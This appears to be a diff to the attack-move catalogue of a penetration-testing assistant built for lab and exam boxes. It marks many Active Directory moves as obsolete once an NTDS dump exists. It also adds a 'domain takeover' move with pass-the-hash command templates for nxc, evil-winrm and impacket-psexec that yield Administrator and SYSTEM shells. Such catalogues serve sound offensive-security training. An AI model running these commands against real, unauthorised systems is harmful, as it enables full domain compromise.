@@ -386,6 +386,9 @@
     "ad.dc_candidate",
     "port:88"
    ],
+   "obsoleted_by": [
+    "loot.ntds"
+   ],
    "produces": [
     "hash.asrep",
     "credential.candidate"
@@ -456,6 +459,9 @@
     "hash.asrep"
    ],
    "requires_any": [],
+   "obsoleted_by": [
+    "loot.ntds"
+   ],
    "produces": [
     "credential.available"
    ],
@@ -504,6 +510,9 @@
     "hash.tgs"
    ],
    "requires_any": [],
+   "obsoleted_by": [
+    "loot.ntds"
+   ],
    "produces": [
     "credential.available"
    ],
@@ -652,6 +661,9 @@
     "kerberos.reachable",
     "port:88"
    ],
+   "obsoleted_by": [
+    "loot.ntds"
+   ],
    "produces": [
     "hash.tgs",
     "credential.candidate"
@@ -717,6 +729,9 @@
     "ad.user_list"
    ],
    "requires_any": [],
+   "obsoleted_by": [
+    "loot.ntds"
+   ],
    "produces": [
     "credential.available"
    ],
@@ -1075,6 +1090,59 @@
    ]
   },
   {
+   "id": "own-domain-pth",
+   "title": "Own the Domain — Pass-the-Hash as Administrator",
+   "hypothesis": "A completed DCSync / NTDS dump handed you every domain hash, the built-in Administrator (RID 500) among them. There is nothing left to crack: pass that NT hash straight into a login and you ARE Domain Administrator. Confirm it, take an interactive shell, and read the flags — this is the box.",
+   "tool": "evil-winrm",
+   "tools": [
+    "evil-winrm",
+    "impacket-psexec",
+    "impacket-wmiexec",
+    "nxc"
+   ],
+   "os": [
+    "windows"
+   ],
+   "phase": "loot",
+   "requires_all": [
+    "loot.ntds"
+   ],
+   "requires_any": [],
+   "produces": [
+    "access.admin"
+   ],
+   "autonomy": "approve",
+   "priority": 99,
+   "proves": "domain compromise — an interactive session as the built-in Administrator via pass-the-hash",
+   "does_not_prove": "",
+   "report": {
+    "finding": "Full Domain Compromise (Pass-the-Hash as Administrator)",
+    "severity": "critical"
+   },
+   "refs": [
+    "https://github.com/Hackplayers/evil-winrm",
+    "https://github.com/fortra/impacket"
+   ],
+   "commands": [
+    {
+     "tool": "nxc",
+     "run": "nxc smb {{target}} -u administrator -H {{nthash}}",
+     "note": "Confirm the dumped Administrator NT hash authenticates — expect (Pwn3d!). Select the Administrator credential (the one obol pulled from your NTDS dump) on the left so {{nthash}} fills; -H passes the hash, no password needed."
+    },
+    {
+     "tool": "evil-winrm",
+     "run": "evil-winrm -i {{target}} -u administrator -H {{nthash}}",
+     "win": true,
+     "note": "Interactive shell as Administrator over WinRM — pure pass-the-hash, no plaintext. Paste the session banner back so obol marks the WinRM foothold; the 'Hunt for flags (Windows)' move then reads the proof files your lab/exam profile grades on. If 5985/WinRM is closed, use the psexec/wmiexec variants below."
+    },
+    {
+     "tool": "impacket-psexec",
+     "run": "impacket-psexec -hashes ':{{nthash}}' administrator@{{target}}",
+     "note": "SYSTEM shell via pass-the-hash when WinRM is closed. -hashes ':NT' (empty LM half). impacket-wmiexec with the same -hashes is the quieter, semi-interactive alternative."
+    }
+   ]
+  },
+  {
    "id": "lateral-exec",
    "title": "Authenticated Remote Execution",
    "hypothesis": "Valid credentials carrying local admin rights get you code execution: psexec (service-based), wmiexec (quieter, semi-interactive), or WinRM through evil-winrm (a full shell on port 5985). Even with just an NTLM hash, pass-the-hash behaves the same way — you seldom need the plaintext.",
@@ -1176,6 +1244,9 @@
     "credential.available"
    ],
    "requires_any": [],
+   "obsoleted_by": [
+    "loot.ntds"
+   ],
    "produces": [
     "adcs.vulnerable",
     "credential.certificate"
@@ -1236,6 +1307,9 @@
     "credential.certificate"
    ],
    "requires_any": [],
+   "obsoleted_by": [
+    "loot.ntds"
+   ],
    "produces": [
     "credential.available",
     "hash.ntlm"
@@ -1284,6 +1358,9 @@
    "requires_all": [],
    "requires_any": [
     "ad.control_paths"
+   ],
+   "obsoleted_by": [
+    "loot.ntds"
    ],
    "produces": [
     "credential.certificate"
@@ -1459,6 +1536,9 @@
    "requires_any": [
     "ad.dc_candidate"
    ],
+   "obsoleted_by": [
+    "loot.ntds"
+   ],
    "produces": [
     "exploit.candidate",
     "ad.zerologon"
@@ -1495,6 +1575,9 @@
    "requires_all": [],
    "requires_any": [
     "access.admin"
+   ],
+   "obsoleted_by": [
+    "loot.ntds"
    ],
    "produces": [
     "access.system",
@@ -1583,6 +1666,9 @@
    "requires_any": [
     "smb.reachable",
     "port:445"
+   ],
+   "obsoleted_by": [
+    "loot.ntds"
    ],
    "produces": [
     "enum.deep",
@@ -1721,6 +1807,9 @@
    "requires_any": [
     "credential.available",
     "ad.attack_paths"
+   ],
+   "obsoleted_by": [
+    "loot.ntds"
    ],
    "produces": [
     "ad.control_paths",
@@ -2193,6 +2282,9 @@
     "foothold.windows",
     "ad.attack_paths"
    ],
+   "obsoleted_by": [
+    "loot.ntds"
+   ],
    "produces": [
     "ad.control_paths",
     "access.admin"
@@ -2259,6 +2351,9 @@
    "requires_any": [
     "ad.zerologon"
    ],
+   "obsoleted_by": [
+    "loot.ntds"
+   ],
    "produces": [
     "loot.ntds",
     "hash.krbtgt",
@@ -2320,6 +2415,9 @@
    "requires_any": [
     "ad.dc_candidate",
     "credential.available"
+   ],
+   "obsoleted_by": [
+    "loot.ntds"
    ],
    "produces": [
     "ad.coerced_auth",
@@ -2507,6 +2605,9 @@
    "requires_any": [
     "ad.gpo_writable"
    ],
+   "obsoleted_by": [
+    "loot.ntds"
+   ],
    "produces": [
     "ad.gpo_control",
     "access.system"
@@ -2553,6 +2654,9 @@
    "requires_any": [
     "ad.control_paths",
     "ad.attack_paths"
+   ],
+   "obsoleted_by": [
+    "loot.ntds"
    ],
    "produces": [
     "access.system",
